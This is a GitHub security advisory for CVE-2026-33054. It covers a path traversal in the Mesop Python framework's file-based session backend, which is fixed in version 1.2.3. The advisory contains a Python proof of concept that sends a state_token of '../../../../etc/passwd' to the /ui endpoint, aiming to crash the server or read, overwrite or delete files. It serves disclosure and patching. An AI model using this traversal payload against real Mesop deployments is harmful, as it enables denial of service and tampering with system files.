# [C] Mesop has a Path Traversal utilizing `FileStateSessionBackend` leads to Application Denial of Service and File Write/Deletion

## Summary
Severity: Critical
Advisory: GHSA-8qvf-mr4w-9x2c
CVE: CVE-2026-33054
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-8qvf-mr4w-9x2c
Type: github-advisory

## Affected
- PyPI: `mesop` — affected >=0 <1.2.3

## Details
#### Summary
A Path Traversal vulnerability allows any user (or attacker) supplying an untrusted `state_token` through the UI stream payload to arbitrarily target files on the disk under the standard file-based runtime backend. This can result in application denial of service (via crash loops when reading non-msgpack target files as configurations), or arbitrary file manipulation.

#### Details
When the framework is configured to use the disk-based session backend (`FileStateSessionBackend`), the user's `state_token` actively dictates where the runtime session state is physically saved or queried natively on disk. 
In `mesop/server/server.py`, specifically the `ui_stream` endpoint, the `event.state_token` is collected directly from the untrusted incoming protobuf message struct: `mesop.protos.ui_pb2.UserEvent`.
Because this is unconditionally passed to `FileStateSessionBackend._make_file_path(self, token)`, it evaluates standard path operators (e.g. `../../../`). 

```python
# mesop/server/state_session.py
  def _make_file_path(self, token: str) -> Path:
    return self.base_dir / (self.prefix + token)
```
Python's standard library natively resolves OS traversal semantics allowing full escape from the `base_dir` destination intent.

#### PoC
An attacker can utilize Python to craft and send a malicious Protobuf payload to the `/ui` stream.

```python
import requests
import mesop.protos.ui_pb2 as pb # Assuming mesop protos are compiled

# 1. Craft the malicious protobuf message
user_event = pb.UserEvent()
# Escaping the tmp directory via path traversal to target a sensitive file, e.g., the root crontab or a system file
user_event.state_token = "../../../../etc/passwd" 

# Alternatively, targeting Windows:
# user_event.state_token = "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"

serialized_event = user_event.SerializeToString()

# 2. Send the message to the ui stream endpoint
headers = {'Content-Type': 'application/x-protobuf'}
response = requests.post(
    "http://localhost:32123/ui",
    data=serialized_event,
    headers=headers
)

# The server will attempt to parse /etc/passwd using msgpack, 
# resulting in a crash or reading/overwriting operations depending on the request type invoked.
print(response.content)
```

#### Impact
This vulnerability heavily exposes systems hosted utilizing `FileStateSessionBackend`. Unauthorized malicious actors could interact with arbitrary payloads overwriting or explicitly removing underlying service resources natively outside the application bounds.

## References
- https://github.com/mesop-dev/mesop/security/advisories/GHSA-8qvf-mr4w-9x2c
- https://nvd.nist.gov/vuln/detail/CVE-2026-33054
- https://github.com/mesop-dev/mesop/commit/c6b382f363b73ac32c402a2db3aadc7784f66a5b
- https://github.com/mesop-dev/mesop
- https://github.com/mesop-dev/mesop/releases/tag/v1.2.3
